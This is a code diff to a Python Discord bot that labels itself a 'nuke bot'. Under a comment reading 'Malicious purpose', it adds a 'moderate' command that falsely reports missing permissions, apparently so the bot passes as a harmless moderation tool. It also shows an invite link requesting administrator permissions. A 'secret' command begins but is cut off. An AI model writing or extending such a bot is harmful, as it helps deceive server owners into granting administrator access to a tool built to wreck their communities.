@@ -1,4 +1,4 @@
-# nuke bot by MEDMEX#1337/MaxDaKing
+# nuke bot by MEDMEX#7945/MaxDaKing
 
 import discord
 from discord.ext import commands
@@ -108,6 +108,16 @@ async def invite(ctx):
     await channel.send("https://discordapp.com/api/oauth2/authorize?client_id=614036849958060052&permissions=8&redirect_uri=https%3A%2F%2Fdiscordapp.com%2Fapi%2Foauth2%2Ftoken&response_type=code&scope=identify%20bot")
 
 #Malicious purpose
+
+@client.command(pass_context=True)
+async def moderate(ctx):
+    channel = ctx.message.channel
+    embed = discord.Embed(
+        colour = discord.Colour.blue()
+    )
+    embed.add_field(name="Lacking permissions", value="The bot is lacking the permissions to perform this action.")
+    await channel.send(embed=embed)
+
 @client.command(pass_context=True)
 async def secret(ctx):
     member = ctx.message.author
